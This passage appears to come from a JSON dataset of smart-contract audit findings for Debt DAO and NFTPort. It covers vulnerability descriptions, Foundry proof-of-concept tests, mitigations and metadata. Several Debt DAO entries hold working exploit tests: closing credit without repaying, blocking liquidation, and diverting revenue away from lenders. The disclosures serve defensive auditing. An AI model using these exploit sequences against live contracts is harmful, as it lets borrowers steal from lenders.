principalPayment = amount - interest;\n\n        // update individual credit line denominated in token\n        credit.principal -= principalPayment; // @audit-info potential underflow without an error due to the unchecked block\n        credit.interestRepaid += interest;\n        credit.interestAccrued = 0;\n\n        emit RepayInterest(id, interest);\n        emit RepayPrincipal(id, principalPayment);\n\n        return credit;\n    }\n} }\n```\n\nTo demonstrate the issue, copy the following test case and paste it into the `SpigotedLine.t.sol` test file. Then run `forge test --match-test \"test_lender_use_and_repay_underflow\"`.\n\nFollowing scenario causes the repayment to underflow:\n\n1.  Borrower borrows `1 ether` of `revenueToken`\n2.  `2 ether` worth of `revenueToken` is claimed and traded from the revenue contract\n3.  Use all of the previously claimed funds (`2 ether`) to repay the line of credit (= `1 ether`)\n4.  `credit.principal` underflows due to `principalPayment` is larger than `credit.principal`\n\n```solidity\nfunction test_lender_use_and_repay_underflow() public {\n    uint256 largeRevenueAmount = lentAmount * 2;\n\n    deal(address(lender), lentAmount + 1 ether);\n    deal(address(revenueToken), MAX_REVENUE);\n    address revenueC = address(0xbeef); // need new spigot for testing\n    bytes32 id = _createCredit(address(revenueToken), Denominations.ETH, revenueC);\n\n    // 1. Borrow lentAmount = 1 ether\n    _borrow(id, lentAmount);\n\n    // 2. Claim and trade largeRevenueAmount = 2 ether (revenue)\n    bytes memory tradeData = abi.encodeWithSignature(\n      'trade(address,address,uint256,uint256)',\n      address(revenueToken),\n      Denominations.ETH,\n      1 gwei,\n      largeRevenueAmount\n    );\n\n    hoax(borrower);\n    line.claimAndTrade(address(revenueToken), tradeData);\n\n    (, uint256 principalBeforeRepaying,,,,,) = line.credits(line.ids(0));\n    assertEq(principalBeforeRepaying, lentAmount);\n\n    // 3. Use and repay debt with previously claimed and traded revenue (largeRevenueAmount = 2 ether)\n    vm.prank(lender);\n    line.useAndRepay(largeRevenueAmount);\n    (, uint256 _principal,,,,,) = line.credits(line.ids(0));\n\n    uint256 underflowedPrincipal = principalBeforeRepaying;\n\n    unchecked {\n      underflowedPrincipal -= (largeRevenueAmount);\n    }\n\n    // 4. Principal underflowed\n    assertEq(_principal, underflowedPrincipal);\n  }\n```\n\n### Recommended Mitigation Steps\n\nConsider asserting `amount` is less or equal than `credit.principal + credit.interestAccrued` (`require(amount <= credit.principal + credit.interestAccrued);`). Similar as how it is done in [`LineOfCredit.depositAndRepay()`](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L326)\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/461)**\n\n\n***\n\n \n",
      "summary": "\nThis bug report describes an issue with the `SpigotedLine.useAndRepay` function in the CreditLib.sol contract. This function allows a borrower or lender to repay (parts) of a credit line. However, if the amount exceeds the principal and the accrued interest, `credit.principal` will underflow without an error and set the principal value to a very large number. This will force a secured line immediately into liquidation and make it expensive to repay the credit line.\n\nThe recommended mitigation step is to assert that the amount is less or equal than `credit.principal + credit.interestAccrued`. This is similar to how it is done in the LineOfCredit.depositAndRepay() function.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/461",
      "tags": [
        "Overflow/Underflow"
      ],
      "finders": [
        "Trust",
        "rvierdiiev",
        "berndartmueller",
        "hansfriese",
        "0xdeadbeef0x",
        "adriro",
        "aphak5010"
      ]
    },
    {
      "id": "6239",
      "title": "[H-05] Borrower can craft a borrow that cannot be liquidated, even by arbiter. ",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L516-L538\n\n\n## Vulnerability details\n\n## Description\n\nLineOfCredit manages an array of open credit line identifiers called `ids`. Many interactions with the Line operate on ids\\[0\\], which is presumed to be the oldest borrow which has non zero principal. For example, borrowers must first deposit and repay to ids\\[0\\] before other credit lines. \n\nThe list is managed by several functions:\n\n1.  CreditListLib.removePosition - deletes parameter id in the ids array\n2.  CreditListLib.stepQ - rotates all ids members one to the left, with the leftmost becoming the last element\n3.  _sortIntoQ - most complex function, finds the smallest index which can swap identifiers with the parameter id, which satisfies the conditions:\n    1.  target index is not empty\n    2.  there is no principal owed for the target index's credit\n\nThe idea I had is that if we could corrupt the ids array so that ids\\[0\\] would be zero, but after it there would be some other active borrows, it would be a very severe situation. The whileBorrowing() modifier assumes if the first element has no principal, borrower is not borrowing. \n\n```\nmodifier whileBorrowing() {\n    if(count == 0 || credits[ids[0]].principal == 0) { revert NotBorrowing(); }\n    _;\n}\n```\n\nIt turns out there is a simple sequence of calls which allows borrowing while ids\\[0\\] is deleted, and does not re-arrange the new borrow into ids\\[0\\]!\n\n1.  id1 = addCredit() - add a new credit line, a new id is pushed to the end of ids array.\n2.  id2 = addCredit() - called again, ids.length = 2\n3.  close(id1) - calls removePosition() on id1, now ids array is \\[0x000000000000000000000000, id2 \\]\n4.  borrow(id2) - will borrow from id2 and call _sortIntoQ. The sorting loop will not find another index other than id2's existing index (`id == bytes32(0)` is true).\n\nFrom this sequence, we achieve a borrow while ids\\[0\\] is 0! Therefore, credits\\[ids\\[0\\]\\].principal = credits\\[0\\].principal = 0, and whileBorrowing() reverts.\n\nThe impact is massive - the following functions are disabled:\n\n- SecureLine::liquidate()\n- LineOfCredit::depositAndClose()\n- LineOfCredit::depositAndRepay()\n- LineOfCredit::claimAndRepay()\n- LineOfCredit::claimAndTrade()\n\n## Impact\n\nBorrower can craft a borrow that cannot be liquidated, even by arbiter. Alternatively, functionality may be completely impaired through no fault of users.\n\n## Proof of Concept\n\nCopy the following code into LineOfCredit.t.sol\n\n```\nfunction _addCreditLender2(address token, uint256 amount) public {\n    // Prepare lender 2 operations, does same as mintAndApprove()\n    address lender2 = address(21);\n    deal(lender2, mintAmount);\n    supportedToken1.mint(lender2, mintAmount);\n    supportedToken2.mint(lender2, mintAmount);\n    unsupportedToken.mint(lender2, mintAmount);\n    vm.startPrank(lender2);\n    supportedToken1.approve(address(line), MAX_INT);\n    supportedToken2.approve(address(line), MAX_INT);\n    unsupportedToken.approve(address(line), MAX_INT);\n    vm.stopPrank();\n    // addCredit logic\n    vm.prank(borrower);\n    line.addCredit(dRate, fRate, amount, token, lender2);\n    vm.stopPrank();\n    vm.prank(lender2);\n    line.addCredit(dRate, fRate, amount, token, lender2);\n    vm.stopPrank();\n}\nfunction test_attackUnliquidatable() public {\n    bytes32 id_1;\n    bytes32 id_2;\n    _addCredit(address(supportedToken1), 1 ether);\n    _addCreditLender2(address(supportedToken1), 1 ether);\n    id_1 =  line.ids(0);\n    id_2 =  line.ids(1);\n    hoax(borrower);\n    line.close(id_1);\n    hoax(borrower);\n    line.borrow(id_2, 1 ether);\n    id_1 =  line.ids(0);\n    id_2 = line.ids(1);\n    console.log(\"id1 : \", uint256(id_1));\n    console.log(\"id2 : \", uint256(id_2));\n    vm.warp(ttl+1);\n    assert(line.healthcheck() == LineLib.STATUS.LIQUIDATABLE);\n    vm.expectRevert(ILineOfCredit.NotBorrowing.selector);\n    bool isSolvent = line.declareInsolvent();\n}\n```\n\n## Tools Used\n\nManual audit\n\n## Recommended Mitigation Steps\n\nWhen sorting new borrows into the ids queue, do not skip any elements.",
      "summary": "\nThis bug report is about a vulnerability found in the LineOfCredit contract which manages an array of open credit line identifiers called `ids`. The vulnerability is that if the `ids` array is corrupted in a specific way, a borrow can be made while `ids[0]` is zero. This would disable several functions such as `SecureLine::liquidate()` and `LineOfCredit::depositAndClose()`.\n\nThe vulnerability was discovered by a manual audit. The proof of concept involves a sequence of calls where a new credit line is added, the first credit line is closed, and then the second credit line is borrowed from. The sorting loop will not find another index other than the second credit line's existing index, which allows the borrow to go through.\n\nThe recommended mitigation step for this vulnerability is to not skip any elements when sorting new borrows into the `ids` queue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/421",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Trust",
        "bin2chen"
      ]
    },
    {
      "id": "6238",
      "title": "[H-04] Borrower can close a credit without repaying debt",
      "impact": "HIGH",
      "content": "\nA borrower can close a credit without repaying the debt to the lender. The lender will be left with a bad debt and the borrower will keep the borrowed amount and the collateral.\n\n### Proof of Concept\n\nThe `close` function of `LineOfCredit` doesn't check whether a credit exists or not. As a result, the `count` variable is decreased in the internal `_close` function when the `close` function is called with an non-existent credit ID:\n[LineOfCredit.sol#L388](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388):\n\n```solidity\nfunction close(bytes32 id) external payable override returns (bool) {\n    Credit memory credit = credits[id];\n    address b = borrower; // gas savings\n    if(msg.sender != credit.lender && msg.sender != b) {\n      revert CallerAccessDenied();\n    }\n\n    // ensure all money owed is accounted for. Accrue facility fee since prinicpal was paid off\n    credit = _accrue(credit, id);\n    uint256 facilityFee = credit.interestAccrued;\n    if(facilityFee > 0) {\n      // only allow repaying interest since they are skipping repayment queue.\n      // If principal still owed, _close() MUST fail\n      LineLib.receiveTokenOrETH(credit.token, b, facilityFee);\n\n      credit = _repay(credit, id, facilityFee);\n    }\n\n    _close(credit, id); // deleted; no need to save to storage\n\n    return true;\n}\n```\n\n[LineOfCredit.sol#L483](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483):\n\n```solidity\nfunction _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n    if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }\n\n    // return the Lender's funds that are being repaid\n    if (credit.deposit + credit.interestRepaid > 0) {\n        LineLib.sendOutTokenOrETH(\n            credit.token,\n            credit.lender,\n            credit.deposit + credit.interestRepaid\n        );\n    }\n\n    delete credits[id]; // gas refunds\n\n    // remove from active list\n    ids.removePosition(id);\n    unchecked { --count; }\n\n    // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.\n    if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }\n\n    emit CloseCreditPosition(id);\n\n    return true;\n}\n```\n\nProof of Concept:\n\n```solidity\n// contracts/tests/LineOfCredit.t.sol\nfunction testCloseWithoutRepaying_AUDIT() public {\n    assertEq(supportedToken1.balanceOf(address(line)), 0, \"Line balance should be 0\");\n    assertEq(supportedToken1.balanceOf(lender), mintAmount, \"Lender should have initial mint balance\");\n      \n    _addCredit(address(supportedToken1), 1 ether);\n\n    bytes32 id = line.ids(0);\n    assert(id != bytes32(0));\n\n    assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether, \"Lender should have initial balance less lent amount\");\n    \n    hoax(borrower);\n    line.borrow(id, 1 ether);\n    assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether, \"Borrower should have initial balance + loan\");\n    \n    // The credit hasn't been repaid.\n    // hoax(borrower);\n    // line.depositAndRepay(1 ether);\n    \n    hoax(borrower);\n    // Closing with a non-existent credit ID.\n    line.close(bytes32(uint256(31337)));\n\n    // The debt hasn't been repaid but the status is REPAID.\n    assertEq(uint(line.status()), uint(LineLib.STATUS.REPAID));\n\n    // Lender's balance is still reduced by the borrow amount.\n    assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether);\n\n    // Borrower's balance still includes the borrowed amount.\n    assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether);\n}\n```\n\n### Recommended Mitigation Steps\n\nIn the `close` function of `LineOfCredit`, consider ensuring that a credit with the user-supplied ID exists, before closing it.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/258)**\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the LineOfCredit contract of the DebtDAO project. The vulnerability allows a borrower to close a credit without repaying the debt to the lender, leaving the lender with a bad debt and the borrower with the borrowed amount and the collateral. This is possible because the `close` function of `LineOfCredit` does not check whether a credit exists or not. A Proof of Concept has been provided to demonstrate the vulnerability. The recommended mitigation step is to ensure that a credit with the user-supplied ID exists before closing it in the `close` function of `LineOfCredit`. This bug was found through manual review.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/258",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Jeiwan",
        "bin2chen",
        "joestakey",
        "berndartmueller",
        "smiling_heretic",
        "hansfriese",
        "adriro"
      ]
    },
    {
      "id": "6237",
      "title": "[H-03] addCredit / increaseCredit cannot be called by lender first when token is ETH",
      "impact": "HIGH",
      "content": "\n<https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L234>\n\n<https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L270>\n\n### Impact\n\nThe functions `addCredit` and `increaseCredit` both ahve a `mutualConsent` or `mutualConsentById` modifier. Furthermore, these functions are `payable` and the lender needs to send the corresponding ETH with each call. However, if we look at the mutual consent modifier works, we can have a problem:\n\n```solidity\nmodifier mutualConsent(address _signerOne, address _signerTwo) {\n      if(_mutualConsent(_signerOne, _signerTwo))  {\n        // Run whatever code needed 2/2 consent\n        _;\n      }\n}\n\nfunction _mutualConsent(address _signerOne, address _signerTwo) internal returns(bool) {\n        if(msg.sender != _signerOne && msg.sender != _signerTwo) { revert Unauthorized(); }\n\n        address nonCaller = _getNonCaller(_signerOne, _signerTwo);\n\n        // The consent hash is defined by the hash of the transaction call data and sender of msg,\n        // which uniquely identifies the function, arguments, and sender.\n        bytes32 expectedHash = keccak256(abi.encodePacked(msg.data, nonCaller));\n\n        if (!mutualConsents[expectedHash]) {\n            bytes32 newHash = keccak256(abi.encodePacked(msg.data, msg.sender));\n\n            mutualConsents[newHash] = true;\n\n            emit MutualConsentRegistered(newHash);\n\n            return false;\n        }\n\n        delete mutualConsents[expectedHash];\n\n        return true;\n}\n```\n\nThe problem is: On the first call, when the other party has not given consent to the call yet, the modifier does not revert. It sets the consent of the calling party instead.\n\nThis is very problematic in combination with sending ETH for two reasons:\n1. When the lender performs the calls first and sends ETH along with the call, the call will not revert. It will instead set the consent for him, but the sent ETH is lost.\n2. Even when the lender thinks about this and does not provide any ETH on the first call, the borrower has to perform the second call. Of course, he will not provide the ETH with this call, but this will cause the transaction to revert. There is now no way for the borrower to also grant consent, but still let the lender perform the call.\n\n### Proof Of Concept\n\nLender Alice calls `LineOfCredit.addCredit` first to add a credit with 1 ETH. She sends 1 ETH with the call. However, because borrower Bob has not performed this call yet, the function body is not executed, but the 1 ETH is still sent. Afterwards, Bob wants to give his consent, so he performs the same call. However, this call reverts, because Bob does not send any ETH with it.\n\n### Recommended Mitigation Steps\n\nConsider implementing an external function to grant consent to avoid this scenario. Also consider reverting when ETH is sent along, but the other party has not given their consent yet.\n\n**[dmvt (judge) increased severity to High](https://github.com/code-423n4/2022-11-debtdao-findings/issues/125)**\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/125)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the LineOfCredit smart contract, which is part of the DebitDAO project. The vulnerability is related to the `addCredit` and `increaseCredit` functions, which have a `mutualConsent` or `mutualConsentById` modifier, and are `payable`. The issue is that when one party calls the function and sends ETH, but the other party has not yet given their consent, the function will not revert, but instead set the consent for the calling party, resulting in the ETH being lost. \n\nThe bug can be demonstrated by an example of lender Alice and borrower Bob. Alice calls `LineOfCredit.addCredit` first to add a credit with 1 ETH, sending 1 ETH with the call. However, because Bob has not performed this call yet, the function body is not executed, but the 1 ETH is still sent. Afterwards, Bob wants to give his consent, so he performs the same call. However, this call reverts, because Bob does not send any ETH with it. \n\nThe bug report recommends two mitigation steps: consider implementing an external function to grant consent to avoid this scenario, and consider reverting when ETH is sent along, but the other party has not given their consent yet.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/125",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Trust",
        "minhquanym",
        "berndartmueller",
        "Lambda",
        "HE1M",
        "adriro"
      ]
    },
    {
      "id": "6236",
      "title": "[H-02] Non-existing revenue contract can be passed to claimRevenue to send all tokens to treasury",
      "impact": "HIGH",
      "content": "\nNeither `SpigotLib.claimRevenue` nor `SpigotLib._claimRevenue` check that the provided `revenueContract` was registered before. If this is not the case, `SpigotLib._claimRevenue` assumes that this is a revenue contract with push payments (because `self.settings[revenueContract].claimFunction` is 0) and just returns the difference since the last call to `claimRevenue`:\n\n```solidity\n       if(self.settings[revenueContract].claimFunction == bytes4(0)) {\n            // push payments\n\n            // claimed = total balance - already accounted for balance\n            claimed = existingBalance - self.escrowed[token]; //@audit Rebasing tokens\n            // underflow revert ensures we have more tokens than we started with and actually claimed revenue\n        }\n```\n\n`SpigotLib.claimRevenue` will then read `self.settings[revenueContract].ownerSplit`, which is 0 for non-registered revenue contracts:\n\n```solidity\nuint256 escrowedAmount = claimed * self.settings[revenueContract].ownerSplit / 100;\n```\n\nTherefore, the whole `claimed` amount is sent to the treasury.\n\nThis becomes very problematic for revenue tokens that use push payments. An attacker (in practice the borrower) can just regularly call `claimRevenue` with this token and a non-existing revenue contract. All of the tokens that were sent to the spigot since the last call will be sent to the treasury and none to the escrow, i.e. a borrower can ensure that no revenue will be available for the lender, no matter what the configured split is.\n\n### Proof Of Concept\n\nAs mentioned above, the attack pattern works for arbitrary tokens where one (or more) revenue contracts use push payments, i.e. where the balance of the Spigot increases from time to time. Then, the attacker just calls `claimRevenue` with a non-existing address. This is illustrated in the following diff:\n\n```diff\n--- a/contracts/tests/Spigot.t.sol\n+++ b/contracts/tests/Spigot.t.sol\n@@ -174,7 +174,7 @@ contract SpigotTest is Test {\n         assertEq(token.balanceOf(address(spigot)), totalRevenue);\n         \n         bytes memory claimData;\n-        spigot.claimRevenue(revenueContract, address(token), claimData);\n+        spigot.claimRevenue(address(0), address(token), claimData);\n```\n\nThanks to this small modification, all of the tokens are sent to the treasury and none are sent to the escrow.\n\n### Recommended Mitigation Steps\n\nCheck that a revenue contract was registered before, revert if it does not.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/119)** \n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the SpigotLib smart contract. The vulnerability is that neither `SpigotLib.claimRevenue` nor `SpigotLib._claimRevenue` checks that the provided `revenueContract` was registered before. As a result, all of the tokens are sent to the treasury and none are sent to the escrow, which is problematic for revenue tokens that use push payments. This can be exploited by a malicious actor to ensure that no revenue is available for the lender. \n\nThe recommended mitigation step is to check that a revenue contract was registered before, and revert if it does not. This would prevent the malicious actor from exploiting the vulnerability and ensure that the revenue is sent to the appropriate party.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/119",
      "tags": [
        "Validation",
        "Business Logic"
      ],
      "finders": [
        "adriro",
        "berndartmueller",
        "Lambda",
        "aphak5010"
      ]
    },
    {
      "id": "6235",
      "title": "[H-01] Call to declareInsolvent() would revert when contract status reaches liquidation point after repayment of credit position 1",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L143\nhttps://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L83-L86\n\n\n## Vulnerability details\n\n## Impact\nThe modifier `whileBorrowing()` is used along in the call to LineOfCredit.declareInsolvent(). However this check reverts when count == 0 or `credits[ids[0]].principal == 0` . Within the contract, any lender can add credit which adds an entry in credits array, credits[ids]. \n\nAssume, when borrower chooses lender positions including credits[ids[0]] to draw on, and repays back the loan fully for credits[ids[1]], then the call to declareInsolvent() by the arbiter would revert since it does not pass the `whileBorrowing()` modifier check due to the ids array index shift in the call to  stepQ(), which would shift ids[1] to ids[0], thereby making the condition for `credits[ids[0]].principal == 0` be true causing the revert.\n\n\n\n## Proof of Concept\n1. LineOfCredit contract is set up and 5 lenders have deposited into the contract.\n2. Alice, the borrower borrows credit from these 5 credit positions including by calling LineOfCredit.borrow() for the position ids.\n3. Later Alice pays back the loan for  credit position id 1 just before the contract gets liquidated\n4. At the point where ids.stepQ() is called in _repay(), position 1 is moved to ids[0]\n4. When contract status is LIQUIDATABLE, no loan drawn on credit position 0 and arbiter calls declareInsolvent() , the call would revert since `credits[ids[0]].principal == 0`\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nThe modifier whileBorrowing() would need to be reviewed and amended.",
      "summary": "\nThis bug report concerns the LineOfCredit contract, which is used to manage a line of credit for a borrower. The bug occurs when the borrower pays back the loan for a credit position, and the contract status is set to LIQUIDATABLE. In this case, the call to declareInsolvent() by the arbiter would revert, as the whileBorrowing() modifier check does not pass. This is because the ids array index shift in the call to  stepQ() shifts ids[1] to ids[0], thus making the condition for `credits[ids[0]].principal == 0` be true, causing the revert.\n\nTo reproduce the bug, the LineOfCredit contract must be set up and 5 lenders must have deposited into the contract. The borrower (Alice) then borrows credit from these 5 credit positions, including by calling LineOfCredit.borrow() for the position ids. Later, Alice pays back the loan for  credit position id 1 just before the contract gets liquidated. When the contract status is set to LIQUIDATABLE, no loan is drawn on credit position 0 and the arbiter calls declareInsolvent(), causing the call to revert.\n\nThe recommended mitigation step for this bug is to review and amend the modifier whileBorrowing().",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/69",
      "tags": [
        "Liquidation",
        "Business Logic"
      ],
      "finders": [
        "PaludoX0",
        "cryptphi",
        "ayeslick",
        "Ch_301",
        "adriro",
        "perseverancesuccess"
      ]
    },
    {
      "id": "3555",
      "title": "M-10: Missing check for equal length arrays in transferByOwnerBatch and mintByOwnerBatch",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/33 \n\n## Found by \nobront\n\n## Summary\n\nThe `transferByOwnerBatch()` and `mintByOwnerBatch()` functions in the ERC1155 implementation does not check whether the lengths of the arrays submitted are equal. This can lead to unexpected results.\n\n## Vulnerability Detail\n\nIn the `transferByOwnerBatch()` function, the user submits three arrays (addresses, ids, and amounts), while in the `mintByOwnerBatch()` function, the user submits four arrays (addresses, ids, amounts, uris).\n\nThe expectation is that the user submitting the function will ensure that the indexes of the arrays correspond to the correct values in the other arrays, and thus that the lengths will be the same.\n\nCommon practice in such a situation is to verify that the lengths are equal to ensure the user hasn't made an error. In other functions like `burnBatch()`, this verification is done by the underlying ERC1155 function. \n\nHowever, in these two functions, we simply iterate through the `ids` array without performing this check, and then call out to the underlying ERC1155 `_safeTransferFrom()`  or `_mint()` functions for each id separately.\n\n## Impact\n\nIf the `ids` array is a shorter length than the other arrays, the additional values in the other arrays will be ignored. This could lead to transfers with unexpected results, which would be better served by reverting.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC1155NFTProduct.sol#L206-L215\n\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/ERC1155NFTProduct.sol#L279-L299\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd a check to the `transferByOwnerBatch()` function that confirms that to, ids, and amounts are all equal length.\n\n```solidity\nrequire(ids.length == to.length, \"mismatched array lengths\");\nrequire(ids.length == amounts.length, \"mismatched array lengths\");\n```\n\nAdd a check to the `mintByOwnerBatch()` function that confirms that to, ids, amounts, and uris are all equal length.\n\n```solidity\nrequire(ids.length == to.length, \"mismatched array lengths\");\nrequire(ids.length == amounts.length, \"mismatched array lengths\");\nrequire(ids.length == uris.length, \"mismatched array lengths\");\n```\n\n## Discussion\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/13\n\n**rayn731**\n\nFixed, checks the arrays' length should be equal.",
      "summary": "\nThis bug report is about two functions in the ERC1155 implementation, `transferByOwnerBatch()` and `mintByOwnerBatch()`. These functions do not check whether the lengths of the arrays submitted by the user are equal. This can lead to unexpected results, as the extra values in the other arrays will be ignored. To prevent this issue, a check should be added to both functions to ensure that the lengths of the arrays are equal. This has been fixed in the code, and the check is now in place.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/33",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "3554",
      "title": "M-9: Factory uses signature that do not have expiration",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/46 \n\n## Found by \nrvierdiiev\n\n## Summary\nNftPort can't remove license from user, once the signature was provided to it, without changing `SIGNER_ROLE` address.\n\n## Vulnerability Detail\nIn Factory contract there are few [methods](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L186-L225) that are called when signed by trusted signer.\n\nThis is how the signature is checked\n```solidity\nsignedOnly(abi.encodePacked(msg.sender, instance, data), signature)\n```\n\nAs you can see there is no any expiration time. That means that once, the signer has signed the signature for the user it can use it for the end of life. It's like lifetime license.\nThe only option to remove the license from user is to revoke `SIGNER_ROLE` and set it to another account. \nBut it's possible that the NFTPort will have a need to do that with current signer.\n## Impact\nLicense can't be removed.\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L222\n## Tool used\n\nManual Review\n\n## Recommendation\nAdd expiration param to the signature.\n\n## Discussion\n\n**hyperspacebunny**\n\nFixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/18\n\n**rayn731**\n\nFixed, it checks expiration on `metadata.expiration`, and it follows EIP-712 standard for hashing and signing data.",
      "summary": "\nThis bug report is about the Factory contract in the NftPort system which cannot remove a license from a user once the signature was provided to it, without changing the SIGNER_ROLE address. The signature was checked using the method `signedOnly(abi.encodePacked(msg.sender, instance, data), signature)`, however, there was no expiration time set which means that the signature can be used for a lifetime. The only way to remove the license from the user is to revoke the SIGNER_ROLE and set it to another account.\n\nThe impact of this bug is that the license cannot be removed. The code snippet for this issue can be found at https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/Factory.sol#L222. The tool used to find this bug was manual review.\n\nThe recommendation for this issue is to add an expiration parameter to the signature. This issue has been fixed in https://github.com/nftport/evm-minting-sherlock-fixes/pull/18 and it checks expiration on `metadata.expiration`, and it follows EIP-712 standard for hashing and signing data.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "NFTPort",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-nftport-judging/issues/46",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "3553",
      "title": "M-8: _validateDeploymentConfig function in NFTCollection.sol doesn't check all conditions",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-nftport-judging/issues/51 \n\n## Found by \nElKu\n\n## Summary\n\nDue to not thoroughly checking all conditions of the deployment config, users might not be able to mint certain amount of tokens. \n\n## Vulnerability Detail\n\nIn `NFTCollection.sol`, there is a function called [_validateDeploymentConfig](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L325-L340), which checks whether the `deploymentConfig` input to [initialize](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L145) function is valid. \n\nThe function checks whether the `maxSupply` and `tokensPerMint` are greater than zero. But it never checks if the `tokensPerMint` is less than or equal to `maxSupply`. \n\nSuppose `maxSupply` < `tokensPerMint`. Then if the user calls a function which in-turn calls the  [_mintTokens](https://github.com/sherlock-audit/2022-10-nftport/blob/main/evm-minting-master/contracts/templates/NFTCollection.sol#L317) function with an `amount` equal to `tokensPerMint`, it will revert. Even though he is technically trying to mint as per the `rules`. This is because the `availableSupply()` won't be greater than `amount`. \n\n\n## Impact\n\n1. Dissatisfaction and Frustration of the user along with loss of his gas fees. \n2. The contract would need redeployment as deployment config cannot be changed once its set.\n\n## Code Snippet\n\n```solidity\n    function _mintTokens(address to, uint256 amount) internal {\n        require(amount <= _deploymentConfig.tokensPerMint, \"Amount too large\");\n        require(amount <= availableSupply(), \"Not enough tokens left\");\n\n        _safeMint(to, amount);\n    }\n```\n\n## Tool used\n\nManual Review, VSCode\n\n## Recommendation\n\nAdd a require statement in the `_validateDeploymentConfig` function:\n```solidity\nrequire(config.tokensPerMint 